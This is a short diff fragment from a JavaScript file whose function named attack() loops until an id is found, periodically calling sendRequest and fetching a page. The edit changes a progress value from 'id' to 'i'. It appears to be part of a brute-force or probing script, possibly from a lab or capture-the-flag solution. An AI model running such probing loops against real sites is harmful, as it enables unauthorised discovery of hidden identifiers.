@@ -10,7 +10,7 @@ var idFound = false;
 async function attack() {
     let i = 0;
     while (!idFound) {
-        if (i % 100000 == 0) sendRequest("test="+id)
+        if (i % 100000 == 0) sendRequest("test="+i)
         try {
             await new Promise((resolve, reject) => {
                 //fetch page
